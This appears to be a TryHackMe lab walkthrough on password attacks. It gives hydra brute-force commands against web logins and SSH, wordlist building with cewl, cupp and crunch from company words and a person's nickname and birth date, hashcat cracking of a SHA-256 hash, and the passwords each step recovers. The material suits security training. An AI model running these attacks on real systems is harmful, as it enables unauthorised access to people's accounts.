https://tryhackme.com/room/checkmate

`http://10.130.138.203:5000`

Marco Bianchi
System administrator

##### LVL 1
`http://10.130.138.203:5001/login`
Default credentials
```Shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.130.138.203 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." -V -s 5001
```
--> 12345

##### LVL 2
`http://10.130.138.203:5002`
Password using company words
```Shell
cewl -d 2 -m 3 --lowercase --with-numbers -w cewl_words.txt http://10.130.138.203:5002
```

```Shell
hydra -l marco -P /root/cewl_words.txt 10.130.138.203 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." -V -s 5002
```
--> `excellence`

##### LVL 3
`http://10.130.138.203:5003`
Personal info for password

nickname: `marky`
dob: `14021995`

IT Operations

Generate password list based on personal info
```Shell
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i
```

```Shell
hydra -l marco -P /root/cupp/marco.txt 10.130.138.203 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." -V -s 5003
```
--> `Bianchi2495`

##### LVL 4
Crack SHA-256 hash
`d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b`

```Shell
hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
--> `family`

##### LVL 5
SSH
Username: `marco`
Capitalized company keyword, append the year like 2024 or any other number, exclamation mark

Company words: `security`, `excellence`, `innovation`, `digital`, `cloud`

```Shell
crunch 13 13 -t Security20%%! -o secpw.txt
```

```Shell
hydra -l marco -P /root/secpw.txt 10.130.138.203 -t 4 ssh
```
--> `Security2024!`